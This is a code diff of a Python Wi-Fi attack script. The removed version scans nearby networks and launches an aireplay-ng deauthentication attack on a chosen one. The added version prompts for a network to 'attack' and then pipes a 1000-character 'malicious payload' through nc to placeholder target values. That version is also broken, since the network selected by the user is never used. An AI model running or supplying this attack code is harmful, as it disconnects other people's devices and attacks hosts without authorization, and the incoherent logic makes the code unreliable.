@@ -1,44 +1,48 @@
-import subprocess
-import re
+import os
 
 def scan_wifi():
+    # Use the 'iwlist' command to scan available Wi-Fi networks
+    scan_output = os.popen("iwlist wlan0 scan | grep 'ESSID'").read()
+
+    # Parse the output to extract network names
     networks = []
-    try:
-        # Run command to scan WiFi networks
-        output = subprocess.check_output(['su', '-c', 'iwlist wlan0 scan'], universal_newlines=True)
-        # Use regex to find network names
-        networks = re.findall(r'ESSID:"(.*?)"', output)
-    except subprocess.CalledProcessError:
-        print("Error: Could not scan WiFi networks.")
+    for line in scan_output.split('\n'):
+        if 'ESSID' in line:
+            network_name = line.split('"')[1]
+            networks.append(network_name)
+
+    # Print the available Wi-Fi networks
+    print("Available Wi-Fi Networks:")
+    for i, network in enumerate(networks, 1):
+        print(f"{i}. {network}")
+
     return networks
 
-def deauth_attack(network):
-    try:
-        # Run command to deauthenticate devices on selected network
-        subprocess.run(['su', '-c', 'aireplay-ng --deauth 100 -a ' + network + ' wlan0'], check=True)
-        print("Deauthentication attack initiated...")
-    except subprocess.CalledProcessError:
-        print("Error: Could not initiate deauthentication attack.")
+def select_network(networks):
+    # Prompt the user to select a Wi-Fi network
+    selection = int(input("Enter the number of the Wi-Fi network you want to attack: "))
+    selected_network = networks[selection - 1]  # Adjusting index to match list numbering
+    return selected_network
 
+def pixelpwn_attack(target_network):
+    # Define the target's IP address and port
+    target_ip = "target_ip_address"
+    target_port = "target_port"
+
+    # Construct the malicious payload (change as per your needs)
+    payload = "A" * 1000
+
+    # Craft the command to send the payload
+    command = f"echo '{payload}' | nc {target_ip} {target_port}"
+
+    # Execute the command
+    os.system(command)
+
+# Main function
 def main():
-    print("Scanning available WiFi networks...")
-    available_networks = scan_wifi()
-    if not available_networks:
-        print("No WiFi networks found.")
-        return
-    
-    print("Available WiFi networks:")
-    for i, network in enumerate(available_networks):
-        print(f"{i+1}. {network}")
-
-    choice = int(input("Enter the number corresponding to the network you want to attack: "))
-    if choice < 1 or choice > len(available_networks):
-        print("Invalid choice.")
-        return
-    
-    selected_network = available_networks[choice - 1]
-    print(f"Initiating deauthentication attack on {selected_network}...")
-    deauth_attack(selected_network)
+    networks = scan_wifi()
+    target_network = select_network(networks)
+    pixelpwn_attack(target_network)
 
 if __name__ == "__main__":
     main()
